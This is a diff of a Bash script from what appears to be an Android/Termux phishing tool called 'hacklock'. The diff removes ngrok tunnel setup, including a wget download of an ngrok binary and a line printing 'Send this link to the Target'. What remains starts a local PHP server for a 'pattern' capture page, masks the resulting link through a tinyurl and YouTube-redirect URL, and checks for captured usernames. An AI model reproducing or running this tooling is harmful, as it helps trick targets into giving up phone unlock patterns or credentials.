@@ -88,18 +88,16 @@ am start -a android.intent.action.VIEW -d https://bit.ly/3aP8DJD > /dev/null 2>&
 elif [[ $option == 3 || $option == 03 ]]; then
 am start -a android.intent.action.VIEW -d https://bit.ly/nhwhatschat > /dev/null 2>&1 
 elif [[ $option == 4 || $option == 04 ]]; then
-fixer
-elif [[ $option == 5 || $option == 05 ]]; then
 am start -a android.intent.action.VIEW -d https://bit.ly/nhfollowus > /dev/null 2>&1 
-elif [[ $option == 6 || $option == 06 ]]; then
+elif [[ $option == 5 || $option == 05 ]]; then
 cd $HOME/hacklock/core/update/
 bash update.sh
-elif [[ $option == 7 || $option == 07 ]]; then
+elif [[ $option == 6 || $option == 06 ]]; then
 cd $HOME/hacklock/core/about/
 bash about.sh
-elif [[ $option == 8 || $option == 08 ]]; then
+elif [[ $option == 7 || $option == 07 ]]; then
 am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1 
-elif [[ $option == 9 ]]; then
+elif [[ $option == 8 ]]; then
 exit 1
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
@@ -113,14 +111,8 @@ fi
 
 ####### Stop background execution #######
 stop() {
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkcloud=$(ps aux | grep -o "cloudflared" | head -n1)
-
-if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-fi
 
 if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
@@ -173,34 +165,11 @@ if [[ -e "$HOME/hacklock/core/pattern/usernames.txt" ]]; then
 rm -rf $HOME/hacklock/core/pattern/usernames.txt
 fi
 
-if [[ -e "$HOME/hacklock/ngrok" ]]; then
-echo " "
-else
-cd $HOME/hacklock
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-wget -O ngrok https://github.com/noob-hackers/mrphish/raw/master/core/ngrok > /dev/null 2>&1
-sleep 20
-if [[ -e "$HOME/hacklock/ngrok" ]]; then
-chmod +x ngrok
-sleep 2.0
-printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok downloaded successfully.\n"
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-fi
-
 ####### Server start process #######
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd $HOME/hacklock/core/pattern && php -S 127.0.0.1:5678 > /dev/null 2>&1 & 
 sleep 5
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 127.0.0.1:5678 > /dev/null 2>&1 &
-sleep 20
-
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
 send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
@@ -213,21 +182,6 @@ if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
 start
-}
-
-####### Fix ngrok issue #######
-fixer(){
-clear
-cd $HOME
-ls -a >/dev/null 2>&1
-rm -rf .ngrok2 >/dev/null 2>&1
-printf "\e[1;92m WATCH THIS VIDEO www.noob-hackers.com\e[0m\n"
-read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
-./ngrok authtoken $name >/dev/null 2>&1
-printf "\e[1;92m[\e[0m*\e[1;92m] NGROK FIXED SUCCESSFULLY:\e[0m\e[1;77m %s\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] IF ITS NOT SOLVED THEN USE OPTION CHAT\e[0m\e[1;77m %s\e[0m\n"
-sleep 6.0
-exit 1
 }
 
 ####### Check found data #######
